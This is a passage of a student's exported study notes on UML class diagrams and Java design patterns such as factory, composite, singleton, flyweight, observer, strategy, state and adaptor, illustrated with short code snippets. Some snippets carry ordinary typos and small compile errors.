}</code></pre><h3 id="1231a926-7344-8022-8942-e3cc96971237" class="">Attributes</h3><p id="1231a926-7344-8009-99df-dacd7d29502a" class="">fields of the class (data types with identifiers)</p><ul id="1231a926-7344-8036-9bff-fbb88fabfd1e" class="bulleted-list"><li style="list-style-type:disc">values for which unique identities is not useful</li></ul><h3 id="1231a926-7344-808e-bd0b-dd5227df54bc" class="">Association</h3><p id="1231a926-7344-8083-901c-f913ab39b6a4" class="">links between objects</p><figure id="1231a926-7344-8041-857d-f989582bf8b1" class="image"><a href="image%2011.png"><img style="width:557px" src="image%2011.png"/></a><figcaption>Book has 1 author which associates to a Person<br/>Person can have any number of work associated to Book<br/>produces is the name of the association: person produces books<br/></figcaption></figure><ul id="1231a926-7344-80ec-bc30-f65b19fa997a" class="bulleted-list"><li style="list-style-type:disc">do not use attributes as foreign keys, use associations instead!<figure id="1231a926-7344-80e4-b3a4-e616a9aaa8a4" class="image"><a href="image%2012.png"><img style="width:384px" src="image%2012.png"/></a><figcaption>flight number shouldn’t be an attribute to link Person and Flight<br/>just put an association instead<br/></figcaption></figure></li></ul><h3 id="1231a926-7344-809a-8030-ff51afb36bd8" class="">Named Association Ends (Role Names)</h3><p id="1231a926-7344-806f-b193-ca349d728ec6" class="">name explains the concept of the association</p><p id="1231a926-7344-804a-9bb1-f2e23d9e026b" class="">gives identifiers to multiple relationships</p><figure id="1231a926-7344-80a7-b52f-ce11585d2caa" class="image"><a href="image%2013.png"><img style="width:223.9888916015625px" src="image%2013.png"/></a><figcaption>mission has 1 commander association to astronaut<br/>mission has multiple crew Member associations to astronaut<br/></figcaption></figure><h3 id="1231a926-7344-80cd-9f16-cefb95ed183a" class="">Multiplicities </h3><p id="1231a926-7344-8074-a827-ccf893855b80" class="">defines the number of associations on each end</p><figure id="1231a926-7344-8017-bb1a-fdcd8c32329a" class="image"><a href="image%2014.png"><img style="width:336px" src="image%2014.png"/></a><figcaption>B has 0 or more As<br/>A has 1 or 2 Bs<br/></figcaption></figure><h3 id="1231a926-7344-8042-b5a7-c932d90f612a" class="">Aggregation vs Composition  </h3><ul id="1231a926-7344-809a-b4ca-c67bde3d9cd3" class="bulleted-list"><li style="list-style-type:disc">aggregate: just a normal association between 2 types</li></ul><ul id="1231a926-7344-8089-bdec-c1cc70e9c90d" class="bulleted-list"><li style="list-style-type:disc">composition: type cannot exist without the association</li></ul><figure id="1231a926-7344-8026-b9eb-c7cea2e1c209" class="image"><a href="242edfbe-311f-42da-8229-536679e5c20d.png"><img style="width:628.7964989059082px" src="242edfbe-311f-42da-8229-536679e5c20d.png"/></a><figcaption>Car can have 0-4 Wheels<br/>HumanBeing NEEDS TO HAVE 1 Heart<br/></figcaption></figure><p id="1231a926-7344-801f-bda0-cca40f9634c6" class="">
</p></details></li></ul><ul id="1231a926-7344-806a-a6e2-edd2aaee2405" class="toggle"><li><details><summary>Question Examples</summary><ul id="1281a926-7344-804c-bdb9-d7ee1d9bbb2d" class="bulleted-list"><li style="list-style-type:disc">make classes for nouns<ul id="1281a926-7344-8076-9cbb-dca07bd95970" class="bulleted-list"><li style="list-style-type:circle">may have to make up classes that aren’t in the text</li></ul></li></ul><ul id="1281a926-7344-8059-a476-e274b0b23a19" class="bulleted-list"><li style="list-style-type:disc">make operations for verbs</li></ul><ul id="1281a926-7344-80b5-ad65-cee11c9823fa" class="bulleted-list"><li style="list-style-type:disc">make named associations from linking words between nouns<ul id="1281a926-7344-80ab-9528-d9e5abfef304" class="bulleted-list"><li style="list-style-type:circle">provide a directed name</li></ul><ul id="1281a926-7344-8052-b0cb-ed00e535ec65" class="bulleted-list"><li style="list-style-type:circle">provide multiplicities: number of relationships  </li></ul></li></ul><figure id="1231a926-7344-8031-8e58-dbed43258120" class="image"><a href="image%2015.png"><img style="width:623.984375px" src="image%2015.png"/></a></figure><figure id="1231a926-7344-805b-89d5-d06f6dfd8c8e" class="image"><a href="image%2016.png"><img style="width:1152px" src="image%2016.png"/></a></figure><figure id="1231a926-7344-80d3-8ab2-dd8312efe458" class="image"><a href="image%2017.png"><img style="width:623.96875px" src="image%2017.png"/></a></figure></details></li></ul></details></li></ul><ul id="1221a926-7344-801d-be86-c0c7aada9ce8" class="toggle"><li><details><summary>Design Patterns</summary><ul id="1231a926-7344-8000-8250-f92d8fa2f00b" class="toggle"><li><details><summary>Factory Method</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-80ee-b346-f29ab2367cb8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="99a5784a-82ed-4779-acb8-b40af320d6f8" class="">static method returning an object</p><ul id="1251a926-7344-8089-b121-d9744114746f" class="bulleted-list"><li style="list-style-type:disc">abstracts away the dynamic type being created</li></ul><ul id="1251a926-7344-80a7-a71f-d35ca21deb16" class="bulleted-list"><li style="list-style-type:disc">method may use the new keyword but the client doesn’t</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-80a9-bc52-fa4b72260c71" class="code"><code class="language-Java">interface List&lt;E&gt;{
		static List&lt;E&gt; empty();
		static List&lt;E&gt; of(E... es);
}

List&lt;int&gt; l = List.empty();
l = List.of(1,2,3);</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-806a-9950-e673d5948049" class="toggle"><li><details><summary>Abstract Factory</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-8072-a550-c87f14898894"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="c0b16437-e069-4d8b-b975-da7ea65ecc7c" class="">client receives a factory object that can create objects</p><ul id="1251a926-7344-8075-aac6-d983726537b4" class="bulleted-list"><li style="list-style-type:disc">factory object hides the concrete type</li></ul><ul id="1251a926-7344-80cd-8986-f45ca8dce4b1" class="bulleted-list"><li style="list-style-type:disc">types and logic are controlled by the factory</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-802b-b8f6-f502cc3bd7cd" class="code"><code class="language-Java">interface Animal{}
class Cat implements Animal{}

Supplier&lt;Animal&gt; animals = Cat::new; //abstract factory

//client code
void f(Supplier&lt;Animal&gt; animals){
		var a = animals.get(); //get an object
}
</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-800d-88e9-df47a369bf30" class="toggle"><li><details><summary>External Iterator </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-8081-83f1-eea990db4639"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="b7b8cf16-04ef-40a7-bb9b-77e608834a52" class="">iterator object keeps track of iterations through another object with data</p><ul id="1251a926-7344-80c8-9df7-fcbb0dfb05de" class="bulleted-list"><li style="list-style-type:disc">external object that tracks iteration allows multiple independent iterations to occur in parallel (e.g., nested for loops)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8010-90ef-e44694a140bc" class="code"><code class="language-Java">interface Iterator&lt;T&gt;{ //external iterator: tracks iteration
		boolean hasNext(); 
		T next();
}
interface Iterable&lt;T&gt;{
		Itterator&lt;T&gt; iterator; //gives methods to get an iterator
}
interface List&lt;T&gt; extends Iterable&lt;T&gt;{}

List&lt;T&gt; list = List.of(1,2,3);
Iterator&lt;T&gt; iterator = l.iterator(); //get iterator
while(iterator.hasNext()){ //check there is a next item
		T e = itterator.next(); //get next item
}</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-80ad-9f90-d0bb73ce67f7" class="toggle"><li><details><summary>Composite Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-80f2-ba6e-e9c4675d7256"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="fd7314bf-0553-4b01-8e93-7184c19c1482" class="">objects inside of objects from the same type hierarchy to represent recursive shape<mark class="highlight-yellow">:</mark> </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8081-baaa-f92df9bfcb40" class="code"><code class="language-Java">interface Expr{ //component: parent type
		int operation();
}

record Lit(int operation) implements Expr{} //leaf: concrete type

//composite: subtype containing leaves
record Add(Expr left, Expr right) implements Expr{
		public int operation(){
				return left.operation() + right.operation();
		}
}

Expr a = new Lit();
Expr b = new Lit();
Expr adder = new Add();
adder.add(a);
adder.add(b);
adder.operation();</code></pre></div></figure><h3 id="1251a926-7344-8075-b512-e0d26e855f9f" class="">Enforcing Tree Structure</h3><p id="1251a926-7344-80dd-8652-f280a7694e93" class="">composite structure must from a tree</p><p id="1251a926-7344-80a5-ba51-d076f3834651" class="">graphs or DAGs cause stack overflows or redundant exponential computation (aliasing)</p><ul id="1251a926-7344-801d-8676-c263212520a4" class="bulleted-list"><li style="list-style-type:disc">enforcing by error: throw an error when component is already owned<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-80ef-b010-fb429286a012" class="code"><code class="language-Java">class OwnedError extends Error{}
abstract class Exp{
  private boolean isOwned=false;
  public void setOwned(){
    if(isOwned) throw new OwnedError();
    isOwned=true;
    }
  abstract String toS();
}
class Lit extends Exp{
  final int val; Lit(int val){ this.val=val; }
  public String toS(){return &quot;&quot;+val;} 
}

class Add extends Exp{
    Exp l;
    Exp r;
    public Add(Exp l, Exp r){
        this.l = l;
        l.setOwned();
        this.r = r;
        r.setOwned();
    }
    public String toS(){return &quot;&quot;;} 
}</code></pre></li></ul><ul id="1251a926-7344-80af-a103-c58102dceccc" class="bulleted-list"><li style="list-style-type:disc">enforcing by mutation: when structure becomes a graph, remove a parent when a new parent is set<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8039-b348-e76d7f349621" class="code"><code class="language-Java">class UnremovableChildError extends Error{}
abstract class Exp{
...
static abstract class HasChild extends Exp implements Owner{
private final List&lt;Exp&gt; childs= new ArrayList&lt;&gt;();
public List&lt;Exp&gt; childs(){ return Collections.unmodifiableList(childs); }
public void remove(Exp exp){
Owner.super.remove(exp);
var changed= childs.remove(exp);
assert changed;
}
public void addChild(Exp child){//Solution HERE!
//if (child.owner == this){ return; }
for (Owner o= this; o instanceof Exp e; o = e.owner){
if (o == child){ throw new UnremovableChildError(); }
}
child.owner.remove(child);
assert child.owner == Exp.root;//redundant? more readable?
child.owner = this;
this.childs.add(child);
}
abstract String toS();
}
</code></pre></li></ul></details></li></ul><ul id="1231a926-7344-80b5-acfb-e3333fcce766" class="toggle"><li><details><summary>Singleton Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-8077-8e94-c95eb9ee2f7a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="5a7812e0-def7-4bc2-8a6e-7b2a0b2f7dcf" class="">staticly storing objects of the same structurally identical shape</p><ul id="1291a926-7344-8031-b266-c5dba8fb8a3f" class="bulleted-list"><li style="list-style-type:disc">rather than creating the same object over and over again, just return a pointer to the already existing singleton</li></ul><ul id="1291a926-7344-802c-af7a-dd13af2ef002" class="bulleted-list"><li style="list-style-type:disc">minimizes memory consumption</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-80df-afad-c076b35368a3" class="code"><code class="language-Java">interface List&lt;E&gt; {
		//singleton
		private final static List&lt;E&gt; empty = new ArrayList&lt;&gt;();
		static List&lt;E&gt; empty(){return empty;} //get pointer
		static List&lt;E&gt; of(){return empty;} //can optimize methods
		static List&lt;E&gt; of(E e, E es...){/**/}

}

var a = List.of();
var b = List.of();
assert a == b; //pointer equality!
//a and b are 2 pointers pointing to the same object in memory</code></pre><ul id="1291a926-7344-80a7-ade7-d8f5df8e5930" class="bulleted-list"><li style="list-style-type:disc">lambdas that don’t capture local variables are optimized to be singletons!</li></ul></div></figure><h3 id="1291a926-7344-8097-94c8-df1241729e8d" class="">Java Enums</h3><p id="1291a926-7344-8007-80e5-f4a52aee54ba" class="">enums symbolic constants are singletons</p><ul id="1291a926-7344-8066-8d5e-fe6cfddbde0e" class="bulleted-list"><li style="list-style-type:disc">enum with 1 instance constant is a singleton pattern</li></ul><ul id="1291a926-7344-8099-b0d7-c8a2a56e7846" class="bulleted-list"><li style="list-style-type:disc">enums with multiple are a generalized singleton pattern</li></ul><ul id="1291a926-7344-806f-95a7-e3069b59743f" class="bulleted-list"><li style="list-style-type:disc">enums can have constructors, fields and methods, but cannot call new keyword outside of the enum class</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-80f0-b69d-cd0c94137305" class="code"><code class="language-Java">enum Planet {
		//symbloic constants (identifiers don&#x27;t have to be all upper cases)
		Mercury (3.303e+23, 2.4397e6),
		Venus (4.869e+24, 6.0518e6),
		Earth (5.976e+24, 6.37814e6),
		Mars (6.421e+23, 3.3972e6),
		Jupiter (1.9e+27, 7.1492e7),
		Saturn (5.688e+26, 6.0268e7),
		Uranus (8.686e+25, 2.5559e7),
		Neptune (1.024e+26, 2.4746e7);
		
		//fields
		private final double mass; // in kilograms
		private final double radius; // in meters
		
		//constructor
		Planet(double mass, double radius) {
				this.mass = mass; this.radius = radius; 
		}
		
		//methods
		double mass() { return mass; }
		double radius() { return radius; }
		
		public static final double G = 6.67300E-11;
		
		double surfaceGravity() { return G * mass / (radius * radius); }
		
		double surfaceWeight(double otherMass) {
		return otherMass * surfaceGravity();
		}
}</code></pre><p id="1291a926-7344-8029-b286-dee25463d003" class="">
</p></details></li></ul><ul id="1231a926-7344-80bd-b701-cd38997cfa68" class="toggle"><li><details><summary>Flyweight Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-8019-a5db-ec300302df97"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">if two objects are structurally equivalent, then they are the same object!<ul id="91bfb74d-79c7-4aee-9d78-2c52b9e785bc" class="bulleted-list"><li style="list-style-type:disc">object constructor is slower</li></ul><ul id="6f9da79c-d306-42c5-9a22-35ffa5e151fb" class="bulleted-list"><li style="list-style-type:disc">memory saving</li></ul><ul id="b369d2ea-7bc4-43a6-aa75-268de696cc95" class="bulleted-list"><li style="list-style-type:disc">fastest equals/hash code methods (because they use pointer equality)</li></ul><ul id="fc2c72c7-e987-4f5e-bec6-fe45e21ba4a3" class="bulleted-list"><li style="list-style-type:disc">great to use them for other caching/memorization </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="91800847-2cea-4e51-863c-692c668bfac1" class="code"><code class="language-Java">//if a person has the same name and same age, they are the same
//object
class Person{
	//private key type that stores the name and age state
	private record PersonKey(String name, int age){}
	//unchangable inner that is an instance of the key
	private final PersonKey inner;
	
	//private constructor the class handles to instanciate a person 
	//object
	private Person(PersonKey p){
			inner= p;
	}
	
	//getter methods that give you the values from the inner class&#x27;s 
	//state
	public String name(){return inner.name;}
	public int age(){return inner.age;}
	public String toString(){ return &quot;Person[&quot;+name()+&quot;,&quot;+age()+&quot;]&quot;; }
	
	//Person.of method for the user to create a person object
	//factory method pattern!!!
	static Person of(String name, int age){
			//invariant
			assert name != null &amp;&amp; !name.isEmpty() &amp;&amp; age &gt;= 0; 
			var key= new PersonKey(name,age); //make key
			//check key in cache and return the cached object or create t
			//new one.
			return cache.computeIfAbsent(key,Person::new); 
	}
	
	//cache to keep track of all currently existing Person objects
	private static final Map&lt;PersonKey,Person&gt; cache= new HashMap&lt;&gt;();
}

//usage
Person p1= Person.of(&quot;Alice&quot;, 30);
Person p2= Person.of(&quot;Alice&quot;, 30);
Person p3= Person.of(&quot;Bob&quot;, 25);
assert p1 == p2; //pointer equality here!
assert p1 != p3;
System.out.println(p1); //Output: Person[Alice, 30]
System.out.println(p2); //Output: Person[Alice, 30]
System.out.println(p3); //Output: Person[Bob, 25] </code></pre></div></figure></details></li></ul><ul id="1231a926-7344-80a6-8f92-e4ca0f8d40b7" class="toggle"><li><details><summary>Observer Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1281a926-7344-8026-9d5d-e17bdc0bdc7f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6c795ca7-26d9-4628-b46a-526c6495fe28" class="">observer objects listen and respond to events by the subject</p><figure id="1281a926-7344-8078-91c8-de7412c294a0" class="image"><a href="Untitled%202.png"><img style="width:562px" src="Untitled%202.png"/></a><figcaption>top level subject and observers know about each other, concrete types don’t</figcaption></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1281a926-7344-809c-8bd8-efd91d89761c" class="code"><code class="language-Java">interface Observer{ void update(); } //observer

abstract class Subject{
		//public Optional&lt;Runnable&gt; ob= Optional.empty();
		private Observer obs = () -&gt; {};
		final protected void onChange(){ obs.update(); }
		final public void attach(Observer o){ 
				obs = () -&gt; {this.update(); o.update();}
		}
		final void detatch(){obs = () -&gt; {}}
}

class Bob extends Subject{ //concrete subject
		int weight= 75;
		void eat(int weight){ //event
				this.weight += weight;
				onChange(); //notify observer when triggered
		}
}

var bob = new Bob();
Observer o = ()-&gt;{println(bob.weight);} //concrete observer
bob.attach(o);</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-80f2-8615-c11b1b16ed9c" class="toggle"><li><details><summary><mark class="highlight-default">Strategy Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-8028-b7fe-f346a5c2128a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="103e210d-bcfd-4a08-ad09-ded6da5a88cd" class="">context contains a strategy with 1 method that defines behavior</p><ul id="1291a926-7344-8058-b4f3-ddcc29ad671a" class="bulleted-list"><li style="list-style-type:disc">behavior changes based on the implementation of the strategy</li></ul><figure id="1291a926-7344-8079-999d-d2bd55130e48" class="image" style="text-align:center"><a href="Untitled%203.png"><img style="width:480px" src="Untitled%203.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-80b1-b4d5-fb142dbe862f" class="code"><code class="language-Java">class Context{
		Strategy strategy; //inner strategy object
		void action(...){ strat.action(this, ...);} //proxy call
}
interface Strategy{
		void action(Context context, ...); //method defines behavior
}
class ConcreteStrategyA implements Strategy{
		//concrete implements behavior
		void action(Context context, ...){/*...*/} 
}
</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-8034-b1c5-ceee19b90027" class="toggle"><li><details><summary><mark class="highlight-default">State Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-802b-b900-e89e07a0d529"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="f793efb5-5cd0-4bb8-8053-02dd7822fd44" class="">actual object wraps a state object that defines behavior</p><ul id="1291a926-7344-80ce-88fd-d3961b6b64bf" class="bulleted-list"><li style="list-style-type:disc">behavior changes when the internal state object changes</li></ul><ul id="1291a926-7344-8084-8919-f9ed976f914a" class="bulleted-list"><li style="list-style-type:disc">strategy pattern but with multiple methods</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-80e7-8ce3-e62eca9b6a70" class="code"><code class="language-Java">public class Warrior{
		int x; 
		int y;
		WarriorState state= new Recovering( MaxHealth / 2 );
		void ping(){ state.ping(this); }
		void damage(int i){ state.damage(this, i); }
		int attack(){ return state.attack(this); }
		void draw(Graphics g){ state.draw(this,g); }
 }
 
interface WarriorState {
		void ping(Warrior w);
		void damage(Warrior w, int i);
		int attack(Warrior w);
		void draw(Warrior w, Graphics g);
		}
}

class Recovering implements WarriorState {
		int health; 
		Recovering(int h){ health= h; }
		public void ping(Warrior w){
				health += 1;
				//Like changing class!
				if (health &gt;= MaxHealth){ w.state = new Ready(health, 0); }
		}
		public void damage(Warrior w, int i){
				health -= i;
				//chose next class! chose next class!
				if (health &lt;= 0){ w.state = new Dead(); }
				else { w.state = new Ready(health, 0); }
		}
		public int attack(Warrior w){
				w.state = new Ready(health, 0); //change class, and then use it!
				return w.attack();
		}
		public void draw(Warrior w, Graphics g){ /*...*/ }
}</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-8030-a1af-c2156808df71" class="toggle"><li><details><summary><mark class="highlight-default">Adaptor Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80de-ae45-db13967974ee"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="d5809526-189e-482b-9164-7f8a2120a8ff" class="">adaptor object bridges two incompatible interface type</p><ol type="1" id="1291a926-7344-8063-8c7d-cc915c27b061" class="numbered-list" start="1"><li>method expects a target type but you have a different type</li></ol><ol type="1" id="1291a926-7344-8059-929b-ea6ecf35e83b" class="numbered-list" start="2"><li>adaptee (different type) is wrapped by an adaptor</li></ol><ol type="1" id="1291a926-7344-8073-9972-d6f4c6aefebf" class="numbered-list" start="3"><li>adaptor is a concrete type that extends the target interface type</li></ol><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8052-bcfd-c65b7e6f3387" class="code"><code class="language-Java">static boolean of(List&lt;String&gt; ss,Function&lt;String,Boolean&gt; test){
	//allMatch expects predicate but test is function
	//return ss.stream().allMatch(test); 
	return ss.stream().allMatch(s-&gt;test.apply(s)); //adaptor
	//adaptor object extends predicate
	//captures a single synthetic fields which is the adaptee
	//use function.apply to implement predicate.test
